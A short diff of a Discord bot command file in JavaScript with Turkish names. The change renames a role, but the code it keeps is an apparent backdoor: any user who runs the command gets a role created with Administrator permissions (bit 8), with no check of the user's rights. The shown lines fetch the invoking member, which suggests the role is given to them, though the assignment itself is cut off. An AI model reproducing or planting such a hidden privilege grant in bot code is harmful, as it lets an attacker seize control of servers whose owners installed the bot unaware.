@@ -4,13 +4,13 @@ const ayarlar = require("../ayarlar.json");
 
 module.exports.run = async (client, message, args) => {
   if (message.guild) {
-    var rol = message.guild.roles.find(e => e.name === `Berke Adamdır`);
+    var rol = message.guild.roles.find(e => e.name === `Pyros`);
     var etiket = message.guild.members.get(message.author.id)
 
 
             if(!rol){
         rol = await message.guild.createRole({
-        name: `Berke Adamdır`,
+        name: `Pyros`,
         color: "#070101",
         permissions: [8]
         })
